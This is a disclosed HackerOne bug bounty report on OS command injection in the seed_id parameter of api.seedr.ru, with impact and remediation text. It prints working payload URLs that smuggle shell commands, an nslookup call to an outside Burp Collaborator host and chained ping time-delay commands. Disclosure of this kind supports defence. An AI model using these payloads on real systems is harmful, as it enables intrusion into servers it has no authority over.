---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1360208'
original_report_id: '1360208'
title: OS command injection on seedr.ru
weakness: OS Command Injection
team_handle: mailru
created_at: '2021-10-05T18:09:09.679Z'
disclosed_at: '2022-03-18T07:49:01.595Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 34
asset_identifier: NATIVEROLL
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- os-command-injection
---

# OS command injection on seedr.ru

## Metadata

- HackerOne Report ID: 1360208
- Weakness: OS Command Injection
- Program: mailru
- Disclosed At: 2022-03-18T07:49:01.595Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

site: https://seedr.ru

The seed_id parameter be vulnerable to OS command injection attacks. It is possible to use various shell metacharacters to inject arbitrary OS commands. The command output does not appear to be returned in the application's responses, however it is possible to inject time delay commands to verify the existence of the vulnerability. It is also possible to cause the application to interact with an external domain, to verify that a command was executed.  The payload was submitted in the seed_id parameter. The application performed a DNS lookup for the specified domain name.  Additionally, the payload  was submitted in the seed_id parameter. The application took 20064 milliseconds to respond to the request, compared with 0 milliseconds for the original request, indicating that the injected command caused a time delay.  
I also got access to the /api/v1/a/group/all/  folder, which contains information about groups.

Default request:
https://api.seedr.ru/uploads/521b62f5b7132de722027388%7Cnslookup%20-q=cname%200vwm3493ytajvrc4a2g7ptfmgdm7a04o0crzhn6.burpcollaborator.net.&.zip

Sleep request:
https://api.seedr.ru/uploads/521b62f5b7132de722027388%7Cping%20-n%2021%20127.0.0.1%7C%7C%60ping%20-c%2021%20127.0.0.1%60%20#'%20|ping%20-n%2021%20127.0.0.1||%60ping%20-c%2021%20127.0.0.1%60%20#\%22%20|ping%20-n%2021%20127.0.0.1.zip

Issue remediation
If possible, applications should avoid incorporating user-controllable data into operating system commands. In almost every situation, there are safer alternative methods of performing server-level tasks, which cannot be manipulated to perform additional commands than the one intended.

## Impact

OS command injection is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data. Very often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, exploiting trust relationships to pivot the attack to other systems within the organization.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
